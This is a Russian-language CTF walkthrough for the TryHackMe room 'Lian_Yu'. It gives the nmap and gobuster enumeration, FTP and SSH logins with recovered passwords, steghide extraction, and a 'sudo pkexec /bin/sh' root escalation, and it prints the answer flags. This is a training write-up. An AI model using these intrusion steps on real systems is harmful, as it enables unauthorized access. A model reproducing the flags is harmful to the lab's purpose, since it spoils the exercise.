[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Lian_Yu](https://tryhackme.com/r/room/lianyu) 

Всего 1 заданиe:
## Задание 1
Добро пожаловать в Lian_YU, этот CTF-бокс для новичков в стиле Arrowverse! Захватывайте флаги и получайте удовольствие.

### Ответьте на вопросы ниже
Разверните виртуальную машину и запустите перечисление.
```commandline
Ответ не нужен
```
Какой веб-каталог вы нашли?
```commandline
nmap -sC -sV 10.10.228.22 
gobuster dir -u http://10.10.228.22/ -w/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
# http://10.10.228.22/island
# Code Word -  'vigilante' - (this is our FTP username)
gobuster dir -u http://10.10.228.22/island -w/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
```commandline
2100
```
Каково имя найденного вами файла?
```commandline
# http://10.10.228.22/island/2100
# Here it says there is a file with a '.ticket' extension.
gobuster dir --url 10.10.228.22/island/2100 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket 
```
```commandline
green_arrow.ticket
```
какой пароль FTP?
```commandline
# http://10.10.228.22/island/2100/green_arrow.ticket
# Seems we found an encryption : 'RTy8yhBQdscX'
# Go to https://gchq.github.io/CyberChef/
# Use 'FromBase58' to decode it.
```
```commandline
!#th3h00d
```
как называется файл с паролем SSH?
```commandline
ftp 10.10.228.22
# Username - vigilante
# password - !#th3h00d
ls
cd /home
ls
cd vigilante
ls
mget filename *
ls
exiftool Leave_me_alone.png
# The correct header -- https://en.wikipedia.org/wiki/Portable_Network_Graphics
steghide extract -sf aa.jpg
# password
unzip ss.zip
```
```commandline
shado
```
пользователь.txt
```commandline
cat shado
# M3tahuman
ssh slade@10.10.228.22 
password - M3tahuman
ls
cat user.txt
```
```commandline
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```
корень.txt
```commandline
sudo -l
sudo pkexec /bin/sh
whoami
ls
cat root.txt
```
```commandline
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)